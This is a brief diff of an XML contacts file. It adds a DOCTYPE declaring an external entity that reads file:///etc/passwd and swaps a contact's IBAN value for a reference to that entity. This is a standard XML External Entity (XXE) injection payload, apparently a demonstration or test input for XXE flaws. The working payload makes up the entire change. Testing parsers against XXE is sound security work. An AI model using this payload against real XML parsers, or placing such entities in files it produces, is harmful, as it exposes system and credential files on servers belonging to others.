@@ -1,4 +1,7 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <contacts>
   <contact>
     <name>John Doe</name>
@@ -7,6 +10,6 @@
 
   <contact>
     <name>Business Mike</name>
-    <iban>DE13 2435 4546 3123</iban>
+    <iban>&xxe;</iban>
   </contact>
 </contacts>
